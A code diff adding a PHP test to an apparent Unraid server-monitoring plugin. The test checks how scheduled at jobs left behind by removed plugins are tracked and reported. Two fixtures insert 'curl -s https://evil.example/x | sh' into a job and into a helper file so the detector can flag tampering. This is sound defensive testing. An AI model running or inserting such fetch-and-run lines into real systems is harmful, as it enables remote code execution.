@@ -22290,6 +22290,226 @@ function testWatchmanAtPlugin(): void
 }
 
 /**
+ * A plugin's own job its plugin leaves behind (2026-11-20, the owner's server): ich777's IT87 driver queues the
+ * Plugin-Update-Helper at every boot (`echo "/usr/bin/plugin_update_helper" | at now -M`); atd runs it (=…) until the next
+ * reboot. The owner removed the plugin while it ran and stopped the array: the night shift (its book holds only what is
+ * open) told the same job as one he doesn't know. Now he knows the plugins' jobs by number and whole file (the baseline's
+ * sched.at_plugin, which the night shift has too): the same job, unchanged, its plugin gone — his line about it learns that
+ * once, noted by himself, nothing told; a stranger with the same command, the job changed, the file it runs another — told.
+ */
+function testWatchmanAtLeft(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-atleft-' . getmypid();
+    $src = "$tmp/src";
+    $day = "$tmp/data/watchman";
+    $night = "$tmp/run/nightshift";
+    $ram = "$tmp/run/watchman-mirror.json";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash/user.scripts/scripts', 'flash/it87-driver', 'emhttp/it87-driver',
+              'emhttp/community.applications/scripts', 'proc/2', 'usrbin'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    @mkdir($day, 0700, true);
+    @mkdir("$tmp/run", 0700, true);
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d",
+              'cron_files' => "$src/flash", 'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents",
+              'emhttp_plugins' => "$src/emhttp", 'update_helper' => "$src/usrbin/plugin_update_helper", 'emhttpd' => "$src/proc"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\nnobody:x:99:100::/:/bin/false\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    $install = function (string $id, string $name) use ($src): void {
+        file_put_contents("$src/logplugins/$id.plg", "<PLUGIN name=\"$id\" version=\"2026.11.01\">\n");
+        @mkdir("$src/emhttp/$id", 0700, true);
+        file_put_contents("$src/emhttp/$id/README.md", "**$name**\n");
+    };
+    $install('it87-driver', 'ITE IT87 Driver');
+    $helper = "#!/bin/bash\n# Plugin-Update-Helper\n# by ich777\ninotifywait -q /boot/changes.txt -e move_self,delete_self\n";
+    file_put_contents("$src/flash/it87-driver/plugin_update_helper", $helper);
+    file_put_contents($paths['update_helper'], $helper);
+    $head = fn (int $uid = 0) => "#!/bin/sh\n# atrun uid=$uid gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\n"
+        . "HOME=/root; export HOME\nPATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin; export PATH\n"
+        . "cd / || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER5e4d3c2b'\n$cmds\nmarcinDELIMITER5e4d3c2b\n";
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    $now = strtotime('2026-11-12 14:00:00');
+    $at = fn (string $job) => "$src/atjobs/$job";
+    $queue = function (int $t) use ($paths): void {
+        clearstatcache();
+        touch($paths['atjobs'], $t);
+    };
+    $removed = function (string $id, int $t) use ($src, $paths): void {
+        @unlink("$src/logplugins/$id.plg");
+        exec('rm -rf ' . escapeshellarg("$src/emhttp/$id") . ' ' . escapeshellarg("$src/flash/$id"));
+        touch($paths['plugins'], $t);
+    };
+    $lines = fn (string $dir, string $num) => array_values(array_filter(watchmanLoad($dir)['book'], fn ($e) => watchmanAtOf($e) === $num));
+    $told = fn (array $r) => array_values(array_intersect(array_column($r['told'], 'kind'), ['at_job', 'at_plugin']));
+    $round = fn (int $t) => watchmanRound($paths, $day, 1000, $t, $docker, false, $acks);
+    $num = '0000201c85cd6';
+
+    // the day: the helper queued at boot and running — the plugin's own job, as before; he knows it by its number and file
+    $round($now);
+    file_put_contents($at("=$num"), $head() . $wrap(WATCH_UPDATE_HELPER));
+    $queue($now + 10);
+    $r = $round($now + 300);
+    $k = readJson("$day/baseline.json")['sched']['at_plugin'][$num] ?? [];
+    same('at left: the helper\'s job — the plugin\'s line, noted by himself; he knows the job (its file, whose, the plugin\'s name, the file it runs)',
+        [[], [], 1, 'at_plugin', 'plugin', 'it87-driver', 'ITE IT87 Driver', WATCH_UPDATE_HELPER, 0, true, true],
+        [$r['added'], $told($r), count($lines($day, $num)), $lines($day, $num)[0]['kind'] ?? null, $lines($day, $num)[0]['by'] ?? null, $k['plugin'] ?? null,
+         $k['name'] ?? null, $k['file'] ?? null, $k['uid'] ?? 'x', is_string($k['h'] ?? null), is_string($k['ph'] ?? null)]);
+
+    // the plugin removed (its .plg, its folder and its copy on the flash gone; the helper stays in /usr/bin): the same job,
+    // unchanged — what the removed plugin left, his line says so once; nothing told, nothing for the team lead
+    $removed('it87-driver', $now + 400);
+    $r1 = $round($now + 600);
+    $r2 = $round($now + 900);
+    $l = $lines($day, $num);
+    $page = array_values(array_filter(watchmanPageState($day, $now + 901, false)['book'], fn ($x) => $x['id'] === ($l[0]['id'] ?? '')))[0] ?? [];
+    same('at left: the plugin removed — no at_job, nothing told; the one line knows its plugin left it (when he saw it), noted by himself',
+        [[], [], [], 1, 'at_plugin', 'plugin', false, $now + 600, $now + 300, 'ITE IT87 Driver', "=$num", [], $now + 600],
+        [$r1['added'], $told($r1), $r2['added'], count($l), $l[0]['kind'] ?? null, $l[0]['by'] ?? null, watchmanOpen($l[0] ?? []), $l[0]['p']['left'] ?? null,
+         $l[0]['time'] ?? null, $l[0]['p']['name'] ?? null, $l[0]['p']['job'] ?? null,
+         array_values(array_intersect(array_column(watchmanFindings(watchmanLoad($day)['book']), 'id'), ['at_job', 'at_plugin'])),
+         readJson("$day/baseline.json")['sched']['at_plugin'][$num]['left'] ?? null]);
+    same('at left: on the page and in a search — its own words (the plugin by the name he kept, the file), when its plugin was gone',
+        ['at_plugin_left', 'ITE IT87 Driver', WATCH_UPDATE_HELPER, $now + 600, 'sched', 'T1053.002', 'entry.at_plugin_left'],
+        [$page['v'] ?? null, $page['t']['name'] ?? null, $page['t']['file'] ?? null, $page['p']['left'] ?? null, $page['group'] ?? null, $page['attack'] ?? null,
+         watchmanEntryKey($l[0] ?? [])]);
+
+    // a stranger with the same command (another job number) — told, as before
+    $stranger = 'a0000301c85d10';
+    file_put_contents($at($stranger), $head() . $wrap(WATCH_UPDATE_HELPER));
+    $queue($now + 1000);
+    $r = $round($now + 1200);
+    same('at left: a job he didn\'t know as the plugin\'s, with the same command — told', [['at_job'], ['at_job'], 'at_job', true],
+        [$r['added'], $told($r), $lines($day, substr($stranger, 1))[0]['kind'] ?? null, watchmanOpen($lines($day, substr($stranger, 1))[0] ?? [])]);
+    unlink($at($stranger));
+    $queue($now + 1300);
+    $round($now + 1500);
+
+    // told from here on: a new line of a kind that goes to Unraid's notifications (one an hour per kind — the stranger's was)
+    $news = fn (array $r, string $dir, string $n) => [$r['added'], WATCH_KINDS['at_job'][1], watchmanOpen(array_values(array_filter($lines($dir, $n),
+        fn ($e) => $e['kind'] === 'at_job'))[0] ?? [])];
+    // the known job changed in place (another user — atd's folder unchanged): news, whatever line he has; once
+    file_put_contents($at("=$num"), $head(99) . $wrap(WATCH_UPDATE_HELPER));
+    $r1 = $round($now + 1800);
+    $r2 = $round($now + 2100);
+    $l = $lines($day, $num);
+    same('at left: the known job with another user — told (a line of its own), once; the plugin\'s line stays as it was',
+        [[['at_job'], true, true], [], ['at_plugin', 'at_job'], 'nobody'],
+        [$news($r1, $day, $num), $r2['added'], array_column($l, 'kind'), $l[1]['p']['user'] ?? null]);
+
+    // a reboot: the queue empty — nothing new, he forgets the plugins' jobs
+    unlink($at("=$num"));
+    $queue($now + 2200);
+    $r = $round($now + 2400);
+    same('at left: after a reboot the queue is empty — nothing new, nothing known of a plugin\'s job any more', [[], null],
+        [$r['added'], readJson("$day/baseline.json")['sched']['at_plugin'] ?? null]);
+
+    // the job another (a command added) or the file it runs another, its plugin gone — told
+    $install('it87-driver', 'ITE IT87 Driver');
+    @mkdir("$src/flash/it87-driver", 0700, true);
+    file_put_contents("$src/flash/it87-driver/plugin_update_helper", $helper);
+    touch($paths['plugins'], $now + 2500);
+    $j2 = '=0000401c85e00';
+    $j3 = '=0000501c85e00';
+    file_put_contents($at($j2), $head() . $wrap(WATCH_UPDATE_HELPER));
+    $queue($now + 2510);
+    $round($now + 2700);
+    $removed('it87-driver', $now + 2800);
+    file_put_contents($at($j2), $head() . $wrap(WATCH_UPDATE_HELPER . "\ncurl -s https://evil.example/x | sh"));
+    $r1 = $news($round($now + 3000), $day, substr($j2, 1));
+    unlink($at($j2));
+    $install('it87-driver', 'ITE IT87 Driver');
+    @mkdir("$src/flash/it87-driver", 0700, true);
+    file_put_contents("$src/flash/it87-driver/plugin_update_helper", $helper);
+    touch($paths['plugins'], $now + 3100);
+    file_put_contents($at($j3), $head() . $wrap(WATCH_UPDATE_HELPER));
+    $queue($now + 3110);
+    $round($now + 3300);
+    $removed('it87-driver', $now + 3400);
+    file_put_contents($paths['update_helper'], $helper . "curl -s https://evil.example/x | sh\n");
+    $r2 = $news($round($now + 3600), $day, substr($j3, 1));
+    same('at left: its plugin gone and the job another, or the file it runs another — told', [[['at_job'], true, true], [['at_job'], true, true]], [$r1, $r2]);
+    unlink($at($j3));
+    file_put_contents($paths['update_helper'], $helper);
+    $queue($now + 3700);
+    $round($now + 3900);
+
+    // the neighbour: a plugin's own file (Community Applications' update check, queued «+N min»), the plugin removed while
+    // it waits — its folder gone with it: likewise what it left, noted by himself
+    $install('community.applications', 'Community Applications');
+    file_put_contents("$src/emhttp/community.applications/scripts/updateCheck.php", "<?php\n// check\n");
+    touch($paths['plugins'], $now + 4000);
+    $ca = 'a0000601c86000';
+    file_put_contents($at($ca), $head() . $wrap('/usr/local/emhttp/plugins/community.applications/scripts/updateCheck.php >/dev/null 2>&1'));
+    $queue($now + 4010);
+    $round($now + 4200);
+    $removed('community.applications', $now + 4300);
+    $r = $round($now + 4500);
+    $l = $lines($day, substr($ca, 1));
+    same('at left: a plugin\'s own file waiting, the plugin removed — what it left, nothing told',
+        [[], 1, 'at_plugin', 'Community Applications', 'community.applications/scripts/updateCheck.php', $now + 4500, 'plugin'],
+        [$r['added'], count($l), $l[0]['kind'] ?? null, $l[0]['p']['name'] ?? null, $l[0]['p']['file'] ?? null, $l[0]['p']['left'] ?? null, $l[0]['by'] ?? null]);
+    $install('community.applications', 'Community Applications');
+    file_put_contents("$src/emhttp/community.applications/scripts/updateCheck.php", "<?php\n// check\n");
+    touch($paths['plugins'], $now + 4550);
+    $r = $round($now + 4560);
+    $l = $lines($day, substr($ca, 1));
+    same('at left: the plugin installed again while its job waits — its line again the plugin\'s own, nothing new', [[], 1, false, null],
+        [$r['added'], count($l), isset($l[0]['p']['left']), watchmanEntryVariant($l[0] ?? [])]);
+    unlink($at($ca));
+    $queue($now + 4600);
+    $round($now + 4800);
+
+    // the night shift (the owner's case: the array stopped, the plugin removed): its book has no closed lines, he knows the
+    // job from the day's baseline — nothing told; the night's line and the day's are one after the handover
+    $install('it87-driver', 'ITE IT87 Driver');
+    @mkdir("$src/flash/it87-driver", 0700, true);
+    file_put_contents("$src/flash/it87-driver/plugin_update_helper", $helper);
+    touch($paths['plugins'], $now + 5000);
+    $jn = '=0000701c86100';
+    file_put_contents($at($jn), $head() . $wrap(WATCH_UPDATE_HELPER));
+    $queue($now + 5010);
+    $round($now + 5200);
+    watchmanMirrorWrite($day, $ram, null, $now + 5210, 'boot-1');
+    $n1 = watchmanNightRound($paths, $night, $now + 5300, false, $docker, $ram, null, 'boot-1');
+    $removed('it87-driver', $now + 5400);
+    $n2 = watchmanNightRound($paths, $night, $now + 5600, false, $docker, $ram, null, 'boot-1');
+    $stranger = 'a0000801c86200';
+    file_put_contents($at($stranger), $head() . $wrap(WATCH_UPDATE_HELPER));
+    $queue($now + 5650);
+    $n3 = watchmanNightRound($paths, $night, $now + 5700, false, $docker, $ram, null, 'boot-1');
+    $nl = $lines($night, substr($jn, 1));
+    same('at left: the night shift — the plugin removed: nothing told, its line says what the plugin left; a stranger with the same command: told',
+        ['ram', [], [], [], 1, $now + 5600, 'plugin', [['at_job'], true, true]],
+        [$n1['begun']['from'] ?? null, $n1['added'], $n2['added'], $told($n2), count($nl), $nl[0]['p']['left'] ?? null, $nl[0]['by'] ?? null,
+         $news($n3, $night, substr($stranger, 1))]);
+    unlink($at($stranger));
+    $queue($now + 5750);
+    watchmanNightRound($paths, $night, $now + 5800, false, $docker, $ram, null, 'boot-1');
+    watchmanNightHandover($day, $night, $now + 5900, "$tmp/run/no-lock");
+    $r = $round($now + 6000);
+    $l = $lines($day, substr($jn, 1));
+    same('at left: after the night — one line about the job, the day\'s first time, what the plugin left kept; nothing new',
+        [1, 'at_plugin', $now + 5200, $now + 5600, []], [count($l), $l[0]['kind'] ?? null, $l[0]['time'] ?? null, $l[0]['p']['left'] ?? null, $r['added']]);
+
+    // what he knew is read only in exactly its shape (an older or a newer office's baseline)
+    same('at left: a known job in exactly its shape only', [true, false, false, false],
+        [watchmanAtKnownOk(['h' => 'x', 'uid' => 0, 'plugin' => 'p', 'name' => 'P', 'file' => 'f', 'ph' => null]), watchmanAtKnownOk(['h' => 'x', 'plugin' => '', 'name' => 'P', 'file' => 'f']),
+         watchmanAtKnownOk(['h' => 1, 'plugin' => 'p', 'name' => 'P', 'file' => 'f']), watchmanAtKnownOk(['h' => 'x', 'plugin' => 'p', 'name' => 'P', 'file' => 'f', 'left' => 'soon'])]);
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($day, 'book'));
+    @unlink(watchmanLockFile($night, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * The night shift at boot (2026-10-22, the owner's server after a power-off): Unraid installs the plugins one after the
  * other and starts emhttpd after them — meanwhile a plugin's .cron is written anew (empty a moment), its plugin isn't
  * installed yet, and ich777's Plugin-Update-Helper is queued through atd. None of it is news; a plugin's .cron is
@@ -66667,7 +66887,7 @@ $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlan
                       'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testLogsWakes', 'testLogsWakeTrail', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereProtectionTruth', 'testWhereCronTruth', 'testWhereMoverAdvice', 'testSpace', 'testWhereMap', 'testCleanupSizesUnknown', 'testArrayStoppedDataDir', 'testWhereBuilding', 'testCleanupTick', 'testCleanupJobCap', 'testCleanupJobSameResult', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testFlashDownload', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerUsonetSimple', 'testPartnerAddress', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testCleanEnv', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics',
                       'testRestoreReviewPaths', 'testRestoreSharesTick', 'testBackupSharesTick', 'testRestoreGapsPage', 'testRestoreGapsAgent', 'testRestoreGapsSwap', 'testRestoreShareUnlisted', 'testRestoreGapsLibvirt', 'testRestoreReviewJob', 'testRestoreReviewForeign', 'testRestoreReviewPeek',
-                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testSkipPlaces', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus', 'testFanboyLook'],
+                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanAtLeft', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testSkipPlaces', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus', 'testFanboyLook'],
           'hardening' => ['testRequestTypes', 'testRunDirLeftovers', 'testRunDirCrashLoop', 'testRunDirLink', 'testRunDirBudget', 'testRunDirAudit', 'testRunDirRunCap', 'testRunDirReport', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testAgentZoneChange', 'testHostAtRequeue', 'testHouseDockerSilent', 'testDockerBackLook', 'testDockerGeneration', 'testDockerOffSaid', 'testBackupTruthRest', 'testUncheckedIsNeither', 'testDoneOnlyWhenDone', 'testStaleSaid', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testPartnerQuota', 'testPartnerAside', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim', 'testUsoNetKeys', 'testUsoNetScript', 'testUsoNetJoin', 'testHostShell', 'testOnlyOfficeCron'],
           'strings' => ['testStrings', 'testUnraidWords', 'testNoNightWords'],
           'fanboy' => ['testFanboyPublic', 'testFanboyMetrics', 'testCaretakerNewcomers', 'testFanboyNoWrite', 'testFanboyDetect', 'testFanboySituations', 'testFanboyIdentity', 'testFanboyReport', 'testFanboyHints', 'testFanboyPage',
